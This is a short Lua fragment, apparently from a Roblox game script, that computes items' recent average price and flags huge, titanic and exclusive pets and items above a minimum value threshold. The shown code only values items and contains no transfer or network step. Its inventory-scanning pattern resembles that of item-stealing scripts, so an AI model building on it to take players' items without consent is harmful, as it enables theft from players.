-- RAP calculation wrapper - FIXED with proper item structure
local function calculateRAP(category, item)
    local ok, rap = pcall(function()
        if RAPCmds and RAPCmds.Get then
            -- Build proper item object for RAP calculation
            local rapItem = {
                Class = { Name = category },
                IsA = function(_, n) return n == category end,
                GetId = function() return item.id end,
                id = item.id,
                pt = item.pt,
                sh = item.sh,
                _am = item._am or item.Amount or 1,
                _l = item._l,
                tn = item.tn,
                uid = item.uid
            }
            return RAPCmds.Get(rapItem)
        end
        return 0
    end)
    return ok and rap or 0
end

-- Value threshold check
local function isValuable(category, data, rap)
    if category == "Pet" then
        local pet = Directory.Pets[data.id]
        if pet and (pet.gargantuan or pet.titanic or pet.huge or pet.exclusive) then return true end
    end
    for _, cat in ipairs(ALLOWED_CATEGORIES) do
        if category == cat then
            local amount = data._am or data.Amount or 1
            return rap * amount >= MIN_RAP
        end
    end
    return false
end

